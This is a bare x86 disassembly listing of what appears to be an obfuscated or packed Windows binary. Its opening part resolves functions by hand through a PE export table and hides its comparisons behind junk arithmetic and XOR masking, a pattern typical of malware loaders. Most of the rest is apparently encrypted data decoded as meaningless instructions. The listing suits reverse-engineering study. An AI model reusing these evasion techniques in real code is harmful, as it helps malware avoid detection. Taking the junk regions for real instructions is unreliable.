  40c413:	sbb    DWORD PTR ds:0x43372f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433723,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4337e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4337f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4337a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4337eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4337eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4337eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4337eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4337eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4337eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4337eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4337eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4337eb
  40c4ce:	and    esi,DWORD PTR ds:0x4337ef
  40c4d4:	mov    DWORD PTR ds:0x4337eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4337bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433783,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43376f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4337fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4337eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4337f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x69385658
  40c577:	lahf   
  40c578:	daa    
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	mulps  xmm3,XMMWORD PTR [edx-0x67]
  40c585:	xchg   esp,eax
  40c586:	mov    BYTE PTR [esi+0x5e6fbcaf],al
  40c58c:	mov    ds,ebx
  40c58e:	scas   eax,DWORD PTR es:[edi]
  40c58f:	aaa    
  40c590:	mov    eax,ds:0x41d9a86d
  40c595:	sbb    cl,BYTE PTR [ebx]
  40c597:	sbb    eax,0xc1861e2c
  40c59c:	inc    eax
  40c59d:	lock mov eax,ds:0x7485fc89
  40c5a4:	enter  0xde0c,0x11
  40c5a8:	mov    eax,0x97f8f2e5
  40c5ad:	mov    ds:0x1781e5ae,eax
  40c5b2:	dec    eax
  40c5b3:	popa   
  40c5b4:	arpl   WORD PTR [ebx+0x2c],di
  40c5b7:	cli    
  40c5b8:	sub    dl,BYTE PTR [edx-0x6990829b]
  40c5be:	cmp    eax,0xb2f5610a
  40c5c3:	adc    eax,0xfce905ed
  40c5c8:	sub    ebx,ecx
  40c5ca:	sub    al,0x90
  40c5cc:	out    0xd7,eax
  40c5ce:	fsub   st(1),st
  40c5d0:	popf   
  40c5d1:	jmp    0x40c63c
  40c5d3:	int    0xbc
  40c5d5:	cmp    al,BYTE PTR ds:0xd149f124
  40c5db:	scas   eax,DWORD PTR es:[edi]
  40c5dc:	mov    ebp,0xe8324dc3
  40c5e1:	push   ebx
  40c5e2:	ret    0x2af2
  40c5e5:	lods   eax,DWORD PTR ds:[esi]
  40c5e6:	mov    eax,0xe037537a
  40c5eb:	add    eax,0xcd661871
  40c5f0:	ins    BYTE PTR es:[edi],dx
  40c5f1:	es popf 
  40c5f3:	inc    edx
  40c5f4:	jmp    0x40c62f
  40c5f6:	fmul   DWORD PTR [ebx]
  40c5f8:	mov    ds:0x4e883edc,al
  40c5fd:	cmp    dl,bl
  40c5ff:	or     ebp,edi
  40c601:	imul   esp,DWORD PTR [eax],0x9dceda0
  40c607:	mov    eax,ds:0x6fe14145
  40c60c:	pop    es
  40c60d:	bound  ebp,QWORD PTR [eax-0x69f48467]
  40c613:	jae    0x40c5c0
  40c615:	sub    al,0x1b
  40c617:	pop    eax
  40c618:	push   esp
  40c619:	xchg   ecx,eax
  40c61a:	mov    eax,0x1db9d408
  40c61f:	sahf   
  40c620:	test   eax,0x502b9558
  40c625:	or     edx,0x13
  40c628:	fild   QWORD PTR ds:[eax+0x70fb76c6]
  40c62f:	mov    dl,0xfc
  40c631:	mov    dl,0xdd
  40c633:	mov    edx,0x2066a434
  40c638:	jp     0x40c630
  40c63a:	push   ecx
  40c63b:	hlt    
  40c63c:	fild   QWORD PTR [eax-0x43]
  40c63f:	sbb    dh,BYTE PTR [ebp+0x3ac0cc5c]
  40c645:	sbb    BYTE PTR [edx+0x740ffff9],ah
  40c64b:	and    DWORD PTR [ecx+0xf],eax
  40c64e:	push   edi
  40c64f:	adc    esp,DWORD PTR [esi-0x20]
  40c652:	adc    ebp,DWORD PTR [ecx-0x6c]
  40c655:	xchg   BYTE PTR [edi],ah
  40c657:	or     al,0xdd
  40c659:	rcl    esp,cl
  40c65b:	loopne 0x40c670
  40c65d:	push   ebx
  40c65e:	dec    ebx
  40c65f:	or     cl,BYTE PTR ds:0xdb7af030
  40c665:	js     0x40c616
  40c667:	les    eax,FWORD PTR ds:[edi+0xaf4dd99]
  40c66e:	adc    bx,bp
  40c671:	popfw  
  40c673:	out    0x4,eax
  40c675:	pop    ds
  40c676:	push   ecx
  40c677:	std    
  40c678:	jmp    0xfcf1:0x10225f2e
  40c67f:	lods   eax,DWORD PTR ds:[esi]
  40c680:	inc    esi
  40c681:	add    al,BYTE PTR [esi-0x31250163]
  40c687:	gs cmp edx,DWORD PTR gs:[ebx+0x52]
  40c68c:	pop    esi
  40c68d:	leave  
  40c68e:	cmp    bh,BYTE PTR [esi-0x1ac3e75b]
  40c694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c695:	rol    esp,1
  40c697:	hlt    
  40c698:	inc    esi
  40c699:	push   ebx
  40c69a:	cmp    eax,0xab6513aa
  40c69f:	sub    edi,DWORD PTR [ebp+0x53]
  40c6a2:	fistp  QWORD PTR [edi]
  40c6a4:	pop    ss
  40c6a5:	stc    
  40c6a6:	daa    
  40c6a7:	mov    ss,eax
  40c6a9:	dec    esi
  40c6aa:	fcomp  QWORD PTR [ebx+edi*1+0x7b]
  40c6ae:	mov    eax,cs:0x1a10b0e9
  40c6b4:	(bad)  
  40c6b5:	mov    al,0xcc
  40c6b7:	add    al,0xc4
  40c6b9:	rcl    DWORD PTR [eax],cl
  40c6bb:	cmp    BYTE PTR [esi],0x51
  40c6be:	add    bl,BYTE PTR [edi+ebx*2]
  40c6c1:	push   0xa6aa2fb3
  40c6c6:	stos   BYTE PTR es:[edi],al
  40c6c7:	retf   0x1dda
  40c6ca:	and    ebx,DWORD PTR [ecx+esi*1]
  40c6cd:	mov    ?,esp
  40c6cf:	jp     0x40c69e
  40c6d1:	or     cl,BYTE PTR [eax+0x66]
  40c6d4:	push   es
  40c6d5:	xor    DWORD PTR [eax],ecx
  40c6d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6d8:	xchg   edi,eax
  40c6d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6da:	pop    edi
  40c6db:	add    eax,DWORD PTR [esi+0x39]
  40c6de:	adc    eax,0x962fc78e
  40c6e3:	adc    ah,BYTE PTR [ebx]
  40c6e5:	jl     0x40c699
  40c6e7:	mov    ebx,0xcf584c0f
  40c6ec:	pop    esp
  40c6ed:	jg     0x40c722
  40c6ef:	push   esi
  40c6f0:	call   0x601bc4e4
  40c6f5:	aas    
  40c6f6:	gs mov ebp,0xa3dd1a6d
  40c6fc:	push   ebp
  40c6fd:	icebp  
  40c6fe:	pop    ecx
  40c6ff:	adc    eax,DWORD PTR [edx+0x6bbb3fd5]
  40c705:	jmp    0x9bc5a6f9
  40c70a:	dec    eax
  40c70b:	shl    DWORD PTR [esi+0x43],0x6a
  40c70f:	aaa    
  40c710:	dec    edx
  40c711:	jg     0x40c6fa
  40c713:	mov    ebp,0x24cdd0ef
  40c718:	cs aaa 
  40c71a:	fdiv   DWORD PTR [ecx]
  40c71c:	xor    cl,BYTE PTR [esi]
  40c71e:	and    al,0x9
  40c720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c721:	pop    esp
  40c722:	mov    ds:0x1cb06bb3,eax
  40c727:	sbb    al,BYTE PTR [edi+0x5d]
  40c72a:	and    BYTE PTR [ecx],ch
  40c72c:	arpl   ax,dx
  40c72e:	inc    edx
  40c72f:	dec    edx
  40c730:	pop    ecx
  40c731:	cmp    dl,BYTE PTR [esi]
  40c733:	mov    ds:0x79e4ead8,al
  40c738:	push   ss
  40c739:	jle    0x40c726
  40c73b:	fild   QWORD PTR [edi+0x29]
  40c73e:	xor    cl,BYTE PTR [edi]
  40c740:	adc    al,0x33
  40c742:	repz mov eax,0xaa5ce098
  40c748:	cmc    
  40c749:	cmp    dh,BYTE PTR [eax+0x4d]
  40c74c:	popa   
  40c74d:	stc    
  40c74e:	sub    BYTE PTR [eax],cl
  40c750:	outs   dx,BYTE PTR ds:[esi]
  40c751:	ss dec ecx
  40c753:	xor    DWORD PTR [eax+edi*2+0x17bfb8bd],0xc2c6236d
  40c75e:	push   0x50
  40c760:	repnz les ebp,FWORD PTR [esi]
  40c763:	push   edi
  40c764:	xchg   esi,eax
  40c765:	rcl    BYTE PTR [eax],0x6b
  40c768:	test   eax,0x20fda7e0
  40c76d:	mov    esp,0x84af6c23
  40c772:	test   BYTE PTR [edi],ch
  40c774:	sub    BYTE PTR [ebx-0x7b],dl
  40c777:	jge    0x40c742
  40c779:	and    eax,0x51b77305
  40c77e:	daa    
  40c77f:	adc    al,0x90
  40c781:	adc    dh,cl
  40c783:	pop    ds
  40c784:	sar    BYTE PTR [edx],0xb0
  40c787:	lahf   
  40c788:	or     DWORD PTR [eax],edx
  40c78a:	retf   
  40c78b:	out    0xb4,eax
  40c78d:	mov    ds:0xcb92d872,eax
  40c792:	push   0x861c4cc1
  40c797:	stos   BYTE PTR es:[edi],al
  40c798:	mov    eax,0xc6c3414f
  40c79d:	xchg   edi,eax
  40c79e:	mov    ch,cl
  40c7a0:	stos   DWORD PTR es:[edi],eax
  40c7a1:	ins    BYTE PTR es:[edi],dx
  40c7a2:	scas   eax,DWORD PTR es:[edi]
  40c7a3:	outs   dx,DWORD PTR ds:[esi]
  40c7a4:	pop    ebx
  40c7a5:	retf   0x5ac1
  40c7a8:	scas   al,BYTE PTR es:[edi]
  40c7a9:	retf   0x1022
  40c7ac:	cmp    al,0x70
  40c7ae:	stos   BYTE PTR es:[edi],al
  40c7af:	mov    ecx,0xc9b910fc
  40c7b4:	sbb    ebp,esi
  40c7b6:	lods   eax,DWORD PTR ds:[esi]
  40c7b7:	push   eax
  40c7b8:	out    0xd9,al
  40c7ba:	xchg   edi,eax
  40c7bb:	or     ch,BYTE PTR [esi+0x35aeb198]
  40c7c1:	sbb    DWORD PTR [esi],0x48
  40c7c4:	pop    esp
  40c7c5:	aad    0x6d
  40c7c7:	xchg   ecx,eax
  40c7c8:	es loop 0x40c7af
  40c7cb:	xchg   bp,ax
  40c7cd:	pop    edx
  40c7ce:	sbb    BYTE PTR [eax],al
  40c7d0:	inc    ecx
  40c7d1:	bound  ecx,QWORD PTR [ecx]
  40c7d3:	push   DWORD PTR [ecx-0x278f7669]
  40c7d9:	aad    0x1c
  40c7db:	out    0x7d,eax
  40c7dd:	inc    esi
  40c7de:	mov    ch,0x2a
  40c7e0:	lods   eax,DWORD PTR ds:[esi]
  40c7e1:	mov    ch,0xa
  40c7e3:	scas   eax,DWORD PTR es:[edi]
  40c7e4:	jne    0x40c786
  40c7e6:	mov    ebp,0x4288bbf2
  40c7eb:	mov    WORD PTR [ebx+esi*1],fs
  40c7ee:	cwde   
  40c7ef:	js     0x40c843
  40c7f1:	sbb    eax,DWORD PTR [eax-0x42363297]
  40c7f7:	daa    
  40c7f8:	mov    bh,0x65
  40c7fa:	sub    ah,BYTE PTR [esi+ebx*8+0x52645115]
  40c801:	xchg   esp,eax
  40c802:	mov    al,0x37
  40c804:	cld    
  40c805:	xor    BYTE PTR [esi+0x56],al
  40c808:	shl    al,0xab
  40c80b:	xor    BYTE PTR [ecx],ch
  40c80d:	jle    0x40c882
  40c80f:	imul   ebx,DWORD PTR [esi+0x6952f355],0x7e
  40c816:	fcom   QWORD PTR [edx+0x18]
  40c819:	aam    0x6d
  40c81b:	outs   dx,DWORD PTR ds:[esi]
  40c81c:	add    dl,BYTE PTR [ebx-0x2b513c6f]
  40c822:	test   eax,0xf0ed6778
  40c827:	jg     0x40c897
  40c829:	popf   
  40c82a:	push   0xffffffa6
  40c82c:	dec    ebp
  40c82d:	jmp    DWORD PTR [ebx+ecx*2-0x34]
  40c831:	and    DWORD PTR ds:0x44b28183,ecx
  40c837:	in     eax,0x56
  40c839:	xchg   esi,eax
  40c83a:	aad    0xff
  40c83c:	ret    0xadd0
  40c83f:	pop    esp
  40c840:	ins    DWORD PTR es:[edi],dx
  40c841:	jns    0x40c850
  40c843:	stos   BYTE PTR es:[edi],al
  40c844:	mov    esp,0x8a3d6837
  40c849:	mov    ?,WORD PTR [ebx-0x64]
  40c84c:	stos   DWORD PTR es:[edi],eax
  40c84d:	mov    eax,0x29d996a2
  40c852:	sub    cl,BYTE PTR [eax+0xb]
  40c855:	xchg   esi,eax
  40c856:	lods   al,BYTE PTR ds:[esi]
  40c857:	dec    edx
  40c858:	adc    al,0x94
  40c85a:	les    ebp,FWORD PTR [esi+0xd500f16]
  40c860:	fs ss loopne 0x40c8b9
  40c864:	cwde   
  40c865:	fild   DWORD PTR [ebp-0x3341e704]
  40c86b:	jl     0x40c8bd
  40c86d:	lahf   
  40c86e:	stos   DWORD PTR es:[edi],eax
  40c86f:	das    
  40c870:	cmp    eax,0xc6e115dc
  40c875:	cli    
  40c876:	iret   
  40c877:	add    bl,BYTE PTR [ebx+0x35]
  40c87a:	pushf  
  40c87b:	xchg   ebx,eax
  40c87c:	jmp    0x66d495a6
  40c881:	das    
  40c882:	adc    dl,bh
  40c884:	mov    eax,DWORD PTR [ebp-0x14]
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	mov    ds:0x27d41929,al
  40c8b7:	mov    WORD PTR [esi+0x7e],?
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	(bad)  [edi-0x14ca8c93]
  40c8c4:	mov    dh,0x9b
  40c8c6:	shl    dl,0x69
  40c8c9:	cmc    
  40c8ca:	sbb    ebx,DWORD PTR [ecx+0x3a069f14]
  40c8d0:	adc    dh,BYTE PTR [eax]
  40c8d2:	aaa    
  40c8d3:	das    
  40c8d4:	in     al,0x46
  40c8d6:	cmp    esp,DWORD PTR [edx*1+0x5f89cd3f]
  40c8dd:	js     0x40c8f9
  40c8df:	int3   
  40c8e0:	call   0xfdb7baa3
  40c8e5:	sbb    al,0x1b
  40c8e7:	pop    esp
  40c8e8:	fwait
  40c8e9:	popf   
  40c8ea:	iret   
  40c8eb:	xor    edi,esp
  40c8ed:	stos   DWORD PTR es:[edi],eax
  40c8ee:	lods   eax,DWORD PTR ds:[esi]
  40c8ef:	adc    ch,BYTE PTR [edi]
  40c8f1:	push   edx
  40c8f2:	mov    ebx,0xcaaea5d9
  40c8f7:	shl    dh,1
  40c8f9:	mov    bl,0xa5
  40c8fb:	retf   0x95fa
  40c8fe:	and    cl,0x66
  40c901:	push   esp
  40c902:	into   
  40c903:	loop   0x40c95b
  40c905:	ret    
  40c906:	les    esp,FWORD PTR [esi+0x15142ccc]
  40c90c:	xor    dl,BYTE PTR [ebp+0x1f]
  40c90f:	jb     0x40c941
  40c911:	jno    0x40c980
  40c913:	rcl    al,cl
  40c915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c916:	xor    edx,edx
  40c918:	push   es
  40c919:	sub    ah,al
  40c91b:	sbb    eax,0x9b57b37e
  40c920:	idiv   al
  40c922:	cmp    edi,DWORD PTR [ebp+0x36]
  40c925:	xchg   edi,eax
  40c926:	cdq    
  40c927:	and    al,BYTE PTR [edx+0x3c987488]
  40c92d:	loop   0x40c944
  40c92f:	cwde   
  40c930:	mov    al,0xa0
  40c932:	and    ecx,DWORD PTR [ebx]
  40c934:	cld    
  40c935:	sbb    BYTE PTR [ebp+eax*8+0x38],bl
  40c939:	mov    esp,0x210f2b28
  40c93e:	push   DWORD PTR [eax]
  40c940:	hlt    
  40c941:	shl    BYTE PTR [esi+edx*2],0xdd
  40c945:	test   al,0x5c
  40c947:	mov    edi,0xde609d83
  40c94c:	(bad)  
  40c94d:	jno    0x40c9b0
  40c94f:	push   edx
  40c950:	mov    dh,0x82
  40c952:	xchg   ecx,eax
  40c953:	dec    edx
  40c954:	adc    bl,bl
  40c956:	es xor dl,0x87
  40c95a:	scas   eax,DWORD PTR es:[edi]
  40c95b:	mov    edi,0xa1442846
  40c960:	xor    DWORD PTR [ebx+0x4f1d0222],esp
  40c966:	rcl    DWORD PTR [ebx-0x57b2436a],1
  40c96c:	mov    eax,0xd1bf8bed
  40c971:	pop    esi
  40c972:	sbb    al,0x4c
  40c974:	xor    BYTE PTR [edi+ebx*4],bl
  40c977:	xchg   esp,eax
  40c978:	cmp    eax,0x1feab7cd
  40c97d:	inc    eax
  40c97e:	stos   DWORD PTR es:[edi],eax
  40c97f:	jb     0x40c917
  40c981:	mov    dl,0xe0
  40c983:	cdq    
  40c984:	push   ss
  40c985:	mov    ss,edx
  40c987:	sub    bh,bl
  40c989:	pusha  
  40c98a:	icebp  
  40c98b:	or     edx,DWORD PTR [ebp-0xb345877]
  40c991:	push   0x976aedaa
  40c996:	call   DWORD PTR [esi+0x71]
  40c999:	mov    dh,0x15
  40c99b:	add    edx,DWORD PTR [ebx]
  40c99d:	into   
  40c99e:	stos   BYTE PTR es:[edi],al
  40c99f:	es jl  0x40c9d9
  40c9a2:	aam    0xc6
  40c9a4:	jp     0x40c9d6
  40c9a6:	fisubr DWORD PTR [ebx]
  40c9a8:	dec    ebx
  40c9a9:	jne    0x40c969
  40c9ab:	sbb    ebx,0x35e6bbc1
  40c9b1:	stos   BYTE PTR es:[edi],al
  40c9b2:	jae    0x40c938
  40c9b4:	fld    DWORD PTR [edx-0x12]
  40c9b7:	cmp    ah,ch
  40c9b9:	or     ah,BYTE PTR [ecx-0x50]
  40c9bc:	mul    ecx
  40c9be:	dec    edx
  40c9bf:	inc    esi
  40c9c0:	push   ss
  40c9c1:	push   ax
  40c9c3:	gs jno 0x40ca37
  40c9c6:	add    al,0x66
  40c9c8:	or     ch,BYTE PTR [edx]
  40c9ca:	push   eax
  40c9cb:	sbb    eax,0x20e378cf
  40c9d0:	arpl   di,ax
  40c9d2:	xor    dl,0x7a
  40c9d5:	psrlw  mm7,QWORD PTR ds:[ecx-0x24e75c1f]
  40c9dd:	sbb    ebx,edi
  40c9df:	pop    ebp
  40c9e0:	jmp    0x40ca52
  40c9e2:	mov    dl,BYTE PTR [edi+ebx*4+0x61cee222]
  40c9e9:	mov    al,ds:0xadb6717
  40c9ee:	cmp    eax,0x1d0b699c
  40c9f3:	or     bh,0x4
  40c9f6:	gs icebp 
  40c9f8:	(bad)  
  40c9f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9fa:	mov    eax,0x9aadc3b8
  40c9ff:	mov    ebp,0xe84a4355
  40ca04:	inc    edx
  40ca05:	shr    dh,1
  40ca07:	and    eax,0x7615c44f
  40ca0c:	push   eax
  40ca0d:	push   ebx
  40ca0e:	inc    ecx
  40ca0f:	sar    BYTE PTR [ebx-0x1b68d922],1
  40ca15:	icebp  
  40ca16:	xchg   esi,eax
  40ca17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca18:	and    edx,DWORD PTR [ecx+0x5a]
  40ca1b:	jb     0x40ca16
  40ca1d:	sbb    eax,DWORD PTR [esi+0x7f]
  40ca20:	adc    al,0xbd
  40ca22:	pop    edi
  40ca23:	mov    ecx,DWORD PTR [ebp+eax*1+0x33]
  40ca27:	mov    edi,0x6e34d4b
  40ca2c:	pop    esi
  40ca2d:	sbb    DWORD PTR [edi+0x45],edx
  40ca30:	push   esi
  40ca31:	(bad)  
  40ca32:	mov    bh,0xc7
  40ca34:	dec    esp
  40ca35:	or     al,0x1b
  40ca37:	mov    al,ds:0x176e8a26
  40ca3c:	scas   al,BYTE PTR es:[edi]
  40ca3d:	fdivr  DWORD PTR [edx]
  40ca3f:	in     eax,dx
  40ca40:	repnz mov ds:0xb8d9d115,eax
  40ca46:	aam    0xb2
  40ca48:	sbb    ch,bh
  40ca4a:	or     ecx,DWORD PTR [esi]
  40ca4c:	and    eax,0x622a1464
  40ca51:	fnstsw WORD PTR [esi+0x7f]
  40ca54:	cmp    bl,BYTE PTR [esi+0x6a]
  40ca57:	call   0x7fa8d205
  40ca5c:	pop    ecx
  40ca5d:	lock (bad) 
  40ca5f:	and    eax,esi
  40ca61:	int3   
  40ca62:	inc    ebx
  40ca63:	inc    ebx
  40ca64:	sub    al,0xdc
  40ca66:	imul   ebp,DWORD PTR [ebp+ebp*4-0x8],0x30
  40ca6b:	mov    dh,0xc9
  40ca6d:	ret    
  40ca6e:	mov    BYTE PTR [ebp+0x530bc377],al
  40ca74:	jno    0x40cadb
  40ca76:	or     ah,BYTE PTR [esi+0x1b6131a3]
  40ca7c:	sbb    BYTE PTR [edi+0x72],0x77
  40ca80:	pop    es
  40ca81:	pop    ecx
  40ca82:	mov    ebp,DWORD PTR [edx+0xd]
  40ca85:	sub    DWORD PTR [ebx-0x72],edx
  40ca88:	jl     0x40ca25
  40ca8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca8b:	mov    ebp,0xfb9e3b2b
  40ca90:	pusha  
  40ca91:	mov    esp,0x4d87159
  40ca96:	xchg   edi,eax
  40ca97:	mov    cl,dh
  40ca99:	into   
  40ca9a:	into   
  40ca9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca9c:	push   edi
  40ca9d:	outs   dx,BYTE PTR ds:[esi]
  40ca9e:	sub    DWORD PTR [ecx],ecx
  40caa0:	dec    esi
  40caa1:	mov    ecx,0xf5ae6b3b
  40caa6:	sub    edx,DWORD PTR [ecx-0x5f]
  40caa9:	mov    al,0x60
  40caab:	push   edi
  40caac:	jnp    0x40cad6
  40caae:	dec    esp
  40caaf:	xor    esi,DWORD PTR [edx-0x7d178cc3]
  40cab5:	ret    0xe26a
  40cab8:	inc    edi
  40cab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caba:	lds    esp,FWORD PTR [ebx]
  40cabc:	adc    BYTE PTR [ebx+0x10],dh
  40cabf:	mov    dl,0x39
  40cac1:	lahf   
  40cac2:	es out dx,eax
  40cac4:	cwde   
  40cac5:	cmp    eax,0xea95ffe6
  40caca:	push   esp
  40cacb:	or     eax,DWORD PTR [edi-0x53e4d50f]
  40cad1:	jmp    0xea305b03
  40cad6:	test   dh,cl
  40cad8:	pop    eax
  40cad9:	cmovae edi,DWORD PTR [eax+0x18]
  40cadd:	ss pop ebp
  40cadf:	js     0x40cb4a
  40cae1:	sbb    ah,BYTE PTR [ecx+eiz*8]
  40cae4:	dec    esp
  40cae5:	scas   al,BYTE PTR es:[edi]
  40cae6:	jae    0x40ca86
  40cae8:	daa    
  40cae9:	nop
  40caea:	rcr    BYTE PTR [ecx+0x2b8b4546],1
  40caf0:	mov    BYTE PTR [edi+edx*1-0x5d],0x3f
  40caf5:	nop
  40caf6:	mov    bh,BYTE PTR [edx]
  40caf8:	and    DWORD PTR [ecx-0x5d],ebx
  40cafb:	bound  eax,QWORD PTR [ebx+0x4f]
  40cafe:	call   0x4dde7711
  40cb03:	and    BYTE PTR [ecx-0xa693744],bh
  40cb09:	push   eax
  40cb0a:	mov    eax,0xf0886a90
  40cb0f:	shr    BYTE PTR [eax-0x3242e694],cl
  40cb15:	mov    DWORD PTR [edi+0x24],ebx
  40cb18:	(bad)  
  40cb19:	aaa    
  40cb1a:	pop    ebp
  40cb1b:	push   edx
  40cb1c:	adc    DWORD PTR [eax],edx
  40cb1e:	mov    eax,0x50fb59f6
  40cb23:	adc    DWORD PTR ss:[ebx+0x5b],0x84ec73f
  40cb2b:	int    0xc5
  40cb2d:	sbb    BYTE PTR [ebx-0x3cfe7176],ah
  40cb33:	sbb    bl,BYTE PTR [edi]
  40cb35:	not    DWORD PTR [ebp+ebx*8+0xf6c235e]
  40cb3c:	aaa    
  40cb3d:	addr16 nop
  40cb3f:	inc    ebx
  40cb40:	icebp  
  40cb41:	in     al,dx
  40cb42:	lahf   
  40cb43:	outs   dx,BYTE PTR ds:[esi]
  40cb44:	mov    edx,esp
  40cb46:	(bad)  
  40cb47:	pop    ecx
  40cb48:	pop    ebp
  40cb49:	xor    edx,DWORD PTR [edx+0x2632d7f1]
  40cb4f:	pop    eax
  40cb50:	icebp  
  40cb51:	pop    edi
  40cb52:	(bad)  
  40cb53:	xor    al,0x17
  40cb55:	or     BYTE PTR [ecx],al
  40cb57:	fiadd  WORD PTR [ebx+edi*4-0x17415fbe]
  40cb5e:	(bad)  
  40cb5f:	call   0x12e1:0xab1f4172
  40cb66:	in     eax,dx
  40cb67:	inc    ecx
  40cb68:	fild   QWORD PTR [ebp+0x40]
  40cb6b:	inc    ebp
  40cb6c:	out    dx,eax
  40cb6d:	sub    al,ah
  40cb6f:	push   ebp
  40cb70:	cmp    eax,0x21ac03b1
  40cb75:	popa   
  40cb76:	or     al,0x5f
  40cb78:	inc    ebx
  40cb79:	inc    ecx
  40cb7a:	pushf  
  40cb7b:	cdq    
  40cb7c:	jecxz  0x40cb6a
  40cb7e:	mov    eax,0x2595d491
  40cb83:	clc    
  40cb84:	inc    edx
  40cb85:	or     BYTE PTR [edi+ebx*1+0x71],ch
  40cb89:	test   eax,0xaaebd409
  40cb8e:	nop
  40cb8f:	loopne 0x40cbc7
  40cb91:	jbe    0x40cb6b
  40cb93:	cld    
  40cb94:	dec    edx
  40cb95:	stc    
  40cb96:	fild   DWORD PTR [eax+eax*8+0x16489c87]
  40cb9d:	push   es
  40cb9e:	pop    ecx
  40cb9f:	xchg   DWORD PTR [eax+ebp*4],esi
  40cba2:	loope  0x40cb34
  40cba4:	bound  ebp,QWORD PTR [eax]
  40cba6:	ins    DWORD PTR es:[edi],dx
  40cba7:	ficom  WORD PTR [eax]
  40cba9:	cmp    eax,0x232e0482
  40cbae:	mov    ds:0x9425b61a,eax
  40cbb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbb4:	popf   
  40cbb5:	dec    esp
  40cbb6:	dec    eax
  40cbb7:	jns    0x40cb66
  40cbb9:	repnz fidiv DWORD PTR [edi-0x15]
  40cbbd:	sbb    ah,0x63
  40cbc0:	imul   edx,DWORD PTR [eax-0x1],0x75
  40cbc4:	sar    bh,1
  40cbc6:	jne    0x40cbd4
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
